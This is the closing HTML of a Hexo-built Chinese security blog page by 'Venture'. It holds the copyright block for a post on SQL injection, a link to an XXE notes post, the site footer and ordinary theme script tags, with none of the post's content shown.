+</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Venture</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://yoursite.com/2018/08/19/SQL注入/">http://yoursite.com/2018/08/19/SQL注入/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://yoursite.com" target="_blank">Venture's Blog</a>！</span></div></div><div class="post-meta__tag-list"></div><nav id="pagination"><div class="next-post pull-right"><a href="/2018/08/14/XXE笔记/"><span>XML External Entity Injection --笔记</span><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer><div class="layout" id="footer"><div class="copyright">&copy;2017 - 2018 By Venture</div><div class="framework-info"><span>驱动 - </span><a href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="footer_custom_text">Hi, welcome to my <a href="https://ventureyu.github.io">blog</a>!</div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="/js/third-party/anime.min.js"></script><script src="/js/third-party/jquery.min.js"></script><script src="/js/third-party/jquery.fancybox.min.js"></script><script src="/js/third-party/velocity.min.js"></script><script src="/js/third-party/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.5.6"></script><script src="/js/fancybox.js?version=1.5.6"></script><script src="/js/sidebar.js?version=1.5.6"></script><script src="/js/copy.js?version=1.5.6"></script><script src="/js/fireworks.js?version=1.5.6"></script><script src="/js/transition.js?version=1.5.6"></script><script src="/js/scroll.js?version=1.5.6"></script><script src="/js/head.js?version=1.5.6"></script></body></html>
